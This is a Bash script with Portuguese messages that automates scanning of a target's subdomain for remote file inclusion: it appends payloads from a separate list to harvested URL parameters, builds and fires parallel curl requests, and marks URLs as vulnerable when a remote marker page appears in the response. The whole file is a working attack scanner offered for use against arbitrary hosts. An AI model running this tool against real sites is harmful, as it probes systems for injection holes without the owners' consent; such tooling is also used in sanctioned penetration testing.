#!/bin/bash

cd ../;
pasta=$(pwd);

if [ -e $pasta"/scanner/"$1"/resultados/resultarfi" ];then

    sair=$(zenity --forms   \
        --title="SCANNER RFI -> REMOTE FILE INCLUSION" \
        --text="SCAN DESTE SUB[DOMÍNIO] JÁ REALIZADO!!" \
        --ok-label="OK"
    )
    exit;

else

	mkdir $pasta"/scanner/"$1"/resultados/resultarfi"

	for url in $(cat $pasta"/scanner/"$1"/resultados/"paramslimpos.txt);do
		arquivo=$(echo $url | sed 's/http.*.\/\///');

		for p in $(cat rfiPayloads.txt);do
        	echo 'curl --silent "'$url$p'" -v 2>&1 | grep "mailto:pudim@pudim.com.br" && echo -e '$url'"\033[33;1m VULNERÁVEL A RFI\033[m" >> rfiResultado.txt &'>> $pasta"/scanner/"$1"/resultados/curlsrfiMontados";
		done
	done

	mv $pasta"/scanner/"$1"/resultados/curlsrfiMontados" $pasta"/scanner/"$1"/resultados/resultarfi/";
	cd $pasta"/scanner/"$1"/resultados/resultarfi";

	qtd=$(cat $pasta"/scanner/"$1"/resultados/resultarfi/curlsrfiMontados" | wc -l);
	for (( i=0; i<=$qtd; i++ ));do
    	    echo -e "#!/bin/bash\n" >> "executa"$i".sh";

        	cat $pasta"/scanner/"$1"/resultados/resultarfi/curlsrfiMontados" --number | grep " "$i | sed "s/ $i//" >> "executa"$i".sh";
	done

	echo -e "#!/bin/bash\n" >> executaTudo.sh;

	for arquivo in $(echo -e executa*.sh);do
		echo "./"$arquivo" &" >> executaTudo.sh;
	done

	chmod +x *.sh;

	cat executaTudo.sh | grep -v "./executaTudo.sh &" > rodaTudo.sh;

	rm executaTudo.sh;
	chmod +x rodaTudo.sh;
	./rodaTudo.sh;

	echo -e "\n\033[33;1mATENÇÃO, É RECOMENDADO EXECUTAR ESTA ONE-LINER ABAIXO APÓS ESTES PROCESSOS EM SEGUNDO PLANO SEREM EXECUTADOS!!\033[m";
	pasta=$(pwd);
	echo -e "\ncd "$pasta";cat *.txt > resultado.txt;mv resultado.txt ../;cd ../;rm -rf resulta;";
	echo -e "\nObservação: Esta One-Liner deve ser executada em: "$pasta;
fi
